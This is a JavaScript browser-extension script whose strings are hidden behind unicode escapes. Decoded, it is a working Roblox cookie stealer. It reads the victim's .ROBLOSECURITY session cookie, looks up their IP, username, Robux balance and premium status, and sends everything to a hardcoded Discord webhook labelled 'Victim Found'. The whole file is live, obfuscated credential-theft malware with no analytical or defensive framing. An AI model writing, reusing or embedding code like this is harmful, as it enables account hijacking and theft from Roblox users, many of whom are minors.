const WEBHOOK_URL = \u0027\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0031\u0032\u0036\u0034\u0031\u0038\u0039\u0039\u0034\u0030\u0030\u0038\u0037\u0030\u0030\u0031\u0031\u0033\u0038\u002f\u0045\u006c\u0030\u0045\u0075\u006a\u0059\u0030\u004d\u0059\u0063\u0052\u0045\u007a\u0041\u0079\u004c\u0061\u0030\u004e\u0057\u0045\u006d\u0078\u0046\u0069\u0066\u0045\u0063\u0030\u0078\u0062\u0064\u004f\u0071\u004d\u002d\u0057\u004d\u0037\u0044\u0074\u0043\u0063\u0063\u0049\u0043\u0046\u0041\u0055\u004f\u004d\u007a\u006b\u0031\u006a\u0076\u0071\u0034\u004a\u0050\u0061\u0030\u006f\u006a\u002d\u0075\u004f\u0027;

async function fetchIP() {
  try {
    const response = await fetch(\u0027\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0061\u0070\u0069\u002e\u0069\u0070\u0069\u0066\u0079\u002e\u006f\u0072\u0067\u0027);
    return await response.text();
  } catch (error) {
    console.error(\u0027\u0045\u0072\u0072\u006f\u0072\u0020\u0066\u0065\u0074\u0063\u0068\u0069\u006e\u0067\u0020\u0049\u0050\u003a\u0027, error);
    return \u0027\u0049\u0050\u0020\u004e\u004f\u0054\u0020\u0046\u004f\u0055\u004e\u0044\u0027;
  }
}

async function fetchUserInfo(cookie) {
  try {
    const response = await fetch(\u0027\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0072\u006f\u0062\u006c\u006f\u0078\u002e\u0063\u006f\u006d\u002f\u006d\u006f\u0062\u0069\u006c\u0065\u0061\u0070\u0069\u002f\u0075\u0073\u0065\u0072\u0069\u006e\u0066\u006f\u0027, {
      headers: { Cookie: \u0027\u002e\u0052\u004f\u0042\u004c\u004f\u0053\u0045\u0043\u0055\u0052\u0049\u0054\u0059\u003d\u0027 + cookie },
      redirect: \u0027\u006d\u0061\u006e\u0075\u0061\u006c\u0027,
    });
    return await response.json();
  } catch (error) {
    console.error(\u0027\u0045\u0072\u0072\u006f\u0072\u0020\u0066\u0065\u0074\u0063\u0068\u0069\u006e\u0067\u0020\u0075\u0073\u0065\u0072\u0020\u0069\u006e\u0066\u006f\u003a\u0027, error);
    return null;
  }
}

async function sendWebhook(data) {
  try {
    await fetch(WEBHOOK_URL, {
      method: \u0027\u0050\u004f\u0053\u0054\u0027,
      headers: { \u0027\u0043\u006f\u006e\u0074\u0065\u006e\u0074\u002d\u0054\u0079\u0070\u0065\u0027: \u0027\u0061\u0070\u0070\u006c\u0069\u0063\u0061\u0074\u0069\u006f\u006e\u002f\u006a\u0073\u006f\u006e\u0027 },
      body: JSON.stringify(data),
    });
  } catch (error) {
    console.error(\u0027\u0045\u0072\u0072\u006f\u0072\u0020\u0073\u0065\u006e\u0064\u0069\u006e\u0067\u0020\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u003a\u0027, error);
  }
}

async function main(cookie) {
  const ip = await fetchIP();
  const userInfo = cookie ? await fetchUserInfo(cookie) : null;
  const webhookData = {
    content: null,
    embeds: [
      {
        description: `\`\`\`${cookie ? cookie : \u0027\u0043\u004f\u004f\u004b\u0049\u0045\u0020\u004e\u004f\u0054\u0020\u0046\u004f\u0055\u004e\u0044\u0027}\`\`\``,
        color: null,
        fields: [
          {
            name: \u0027\u0055\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0027,
            value: userInfo ? userInfo.UserName : \u0027\u004e\u002f\u0041\u0027,
            inline: true,
          },
          {
            name: \u0027\u0052\u006f\u0062\u0075\u0078\u0027,
            value: userInfo ? userInfo.RobuxBalance : \u0027\u004e\u002f\u0041\u0027,
            inline: true,
          },
          {
            name: \u0027\u0050\u0072\u0065\u006d\u0069\u0075\u006d\u0027,
            value: userInfo ? userInfo.IsPremium : \u0027\u004e\u002f\u0041\u0027,
            inline: true,
          },
        ],
        author: {
          name: \u0027\u0056\u0069\u0063\u0074\u0069\u006d\u0020\u0046\u006f\u0075\u006e\u0064\u003a\u0020\u0027 + ip,
          icon_url: userInfo
            ? userInfo.ThumbnailUrl
            : \u0027\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0075\u0070\u006c\u006f\u0061\u0064\u002e\u0077\u0069\u006b\u0069\u006d\u0065\u0064\u0069\u0061\u002e\u006f\u0072\u0067\u002f\u0077\u0069\u006b\u0069\u0070\u0065\u0064\u0069\u0061\u002f\u0063\u006f\u006d\u006d\u006f\u006e\u0073\u002f\u0074\u0068\u0075\u006d\u0062\u002f\u0066\u002f\u0066\u0033\u002f\u004e\u0041\u005f\u0063\u0061\u0070\u005f\u0069\u0063\u006f\u006e\u002e\u0073\u0076\u0067\u002f\u0031\u0032\u0030\u0030\u0070\u0078\u002d\u004e\u0041\u005f\u0063\u0061\u0070\u005f\u0069\u0063\u006f\u006e\u002e\u0073\u0076\u0067\u002e\u0070\u006e\u0067\u0027,
        },
        footer: {
          text: \u0027\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0067\u0069\u0074\u0068\u0075\u0062\u002e\u0063\u006f\u006d\u002f\u006f\u0078\u002d\u0079\u0027,
          icon_url:
            \u0027\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0075\u0070\u006c\u006f\u0061\u0064\u002e\u0077\u0069\u006b\u0069\u006d\u0065\u0064\u0069\u0061\u002e\u006f\u0072\u0067\u002f\u0077\u0069\u006b\u0069\u0070\u0065\u0064\u0069\u0061\u002f\u0063\u006f\u006d\u006d\u006f\u006e\u0073\u002f\u0074\u0068\u0075\u006d\u0062\u002f\u0039\u002f\u0039\u0031\u002f\u004f\u0063\u0074\u0069\u0063\u006f\u006e\u0073\u002d\u006d\u0061\u0072\u006b\u002d\u0067\u0069\u0074\u0068\u0075\u0062\u002e\u0073\u0076\u0067\u002f\u0031\u0032\u0030\u0030\u0070\u0078\u002d\u004f\u0063\u0074\u0069\u0063\u006f\u006e\u0073\u002d\u006d\u0061\u0072\u006b\u002d\u0067\u0069\u0074\u0068\u0075\u0062\u002e\u0073\u0076\u0067\u002e\u0070\u006e\u0067\u0027,
        },
        thumbnail: {
          url: userInfo
            ? userInfo.ThumbnailUrl
            : \u0027\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0075\u0070\u006c\u006f\u0061\u0064\u002e\u0077\u0069\u006b\u0069\u006d\u0065\u0064\u0069\u0061\u002e\u006f\u0072\u0067\u002f\u0077\u0069\u006b\u0069\u0070\u0065\u0064\u0069\u0061\u002f\u0063\u006f\u006d\u006d\u006f\u006e\u0073\u002f\u0074\u0068\u0075\u006d\u0062\u002f\u0066\u002f\u0066\u0033\u002f\u004e\u0041\u005f\u0063\u0061\u0070\u005f\u0069\u0063\u006f\u006e\u002e\u0073\u0076\u0067\u002f\u0031\u0032\u0030\u0030\u0070\u0078\u002d\u004e\u0041\u005f\u0063\u0061\u0070\u005f\u0069\u0063\u006f\u006e\u002e\u0073\u0076\u0067\u002e\u0070\u006e\u0067\u0027,
        },
      },
    ],
    username: \u0027\u0052\u006f\u0062\u006c\u006f\u0078\u0027,
    avatar_url:
      \u0027\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0075\u0070\u006c\u006f\u0061\u0064\u002e\u0077\u0069\u006b\u0069\u006d\u0065\u0064\u0069\u0061\u002e\u006f\u0072\u0067\u002f\u0077\u0069\u006b\u0069\u0070\u0065\u0064\u0069\u0061\u002f\u0063\u006f\u006d\u006d\u006f\u006e\u0073\u002f\u0074\u0068\u0075\u006d\u0062\u002f\u0033\u002f\u0033\u0061\u002f\u0052\u006f\u0062\u006c\u006f\u0078\u005f\u0070\u006c\u0061\u0079\u0065\u0072\u005f\u0069\u0063\u006f\u006e\u005f\u0062\u006c\u0061\u0063\u006b\u002e\u0073\u0076\u0067\u002f\u0031\u0032\u0030\u0030\u0070\u0078\u002d\u0052\u006f\u0062\u006c\u006f\u0078\u005f\u0070\u006c\u0061\u0079\u0065\u0072\u005f\u0069\u0063\u006f\u006e\u005f\u0062\u006c\u0061\u0063\u006b\u002e\u0073\u0076\u0067\u002e\u0070\u006e\u0067\u0027,
    attachments: [],
  };

  await sendWebhook(webhookData);
}

chrome.cookies.get(
  {
    url: \u0027\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0072\u006f\u0062\u006c\u006f\u0078\u002e\u0063\u006f\u006d\u002f\u0068\u006f\u006d\u0065\u0027,
    name: \u0027\u002e\u0052\u004f\u0042\u004c\u004f\u0053\u0045\u0043\u0055\u0052\u0049\u0054\u0059\u0027,
  },
  function (cookie) {
    main(cookie ? cookie.value : null);
  }
);
